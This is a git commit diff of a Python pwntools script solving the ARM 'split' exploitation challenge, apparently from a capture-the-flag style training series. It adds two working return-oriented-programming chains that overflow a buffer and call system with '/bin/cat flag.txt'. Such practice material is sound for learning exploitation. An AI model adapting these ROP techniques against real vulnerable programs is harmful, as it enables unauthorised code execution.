5d7d8185490a0d65ef7ade98a864e90544b9dc2a
SoEasY <34216946+0xSoEasY@users.noreply.github.com>
2021-07-12 20:08:52 +0200

    Solving 1-split in ARM (2 payloads)

--- ARM/1-split/solve.py
+++ ARM/1-split/solve.py
@@ -1,9 +1,5 @@
 from pwn import *
 
-########################################
-#####         DOESN'T WORK         #####
-########################################
-
 BINARY = "./split_armv5"
 ELF = ELF(BINARY)
 
@@ -13,26 +9,61 @@ context.binary = BINARY
 
 p = process(BINARY)
 
-mov_r0_r3_pop_pop_pc = p32(0x10558) # mov r0, r3 ; pop {fp, pc}
-pop_r3_pc           = p32(0x103a4) # pop {r3, pc}
-cat_flag            = p32(0x2103C) # "/bin/cat flag.txt"
-mov_r0_r7_blx_r3    = p32(0x10634) # mov r0, r7 ; blx r3
-pop_r45678_sb_sl_pc = p32(0x10644) # pop {r4, r5, r6, r7, r8, sb, sl, pc}
 
-rop = b"A" * 36
-rop += pop_r45678_sb_sl_pc
-rop += b"BBBB"
-rop += b"CCCC"
-rop += b"DDDD"
-rop += cat_flag
-rop += b"EEEE"
-rop += b"FFFF"
-rop += b"GGGG"
-rop += mov_r0_r7_blx_r3
-rop += p32(ELF.symbols["system"])
+cat_flag             = p32(0x2103c) # "/bin/cat flag.txt"
+call_system          = p32(0x105E0) # bl system
+PADDING               = b"BBBB"
+
+
+def payload_1():
+    pop_r45678_sb_sl_pc = p32(0x10644) # pop {r4, r5, r6, r7, r8, sb, sl, pc}   
+    mov_r0_r7_blx_r3    = p32(0x10634) # mov r0, r7 ; blx r3
+    pop_r3_pc           = p32(0x103a4) # pop {r3, pc}
+
+    rop = b"A" * 36
+
+    rop += pop_r3_pc
+    rop += call_system
+
+    rop += pop_r45678_sb_sl_pc
+    rop += PADDING
+    rop += PADDING
+    rop += PADDING
+    rop += cat_flag
+    rop += PADDING
+    rop += PADDING
+    rop += PADDING
+    rop += mov_r0_r7_blx_r3
+    return rop
+
+
+def payload_2():
+    mov_r0_r3_pop_pop_pc = p32(0x10558) # mov r0, r3 ; pop {fp, pc}
+    pop_r3_pc           = p32(0x103a4) # pop {r3, pc}
+    
+    rop = b'A' * 36
+
+    rop += pop_r3_pc
+    rop += cat_flag
+    
+    rop += mov_r0_r3_pop_pop_pc
+    rop += PADDING
+    rop += call_system
+    return rop
+
+
+# Change this value to use the payload n°1 or n°2
+PAYLOAD = 1
+SLICE = 2
+rop = payload_1()
+
+if PAYLOAD == 2:
+    rop = payload_2()
+    SLICE = 6
 
 log.success(f"ROP chain : {rop}")
-pause()
+#pause() --> pause execution to debug with gdb -p <process PID>
 p.sendline(rop)
-flag = p.recv().split(b'\n')
+
+flag = p.recvall(timeout=0.1).split(b'\n')[-SLICE]
 log.success(f"FLAG : {flag}")
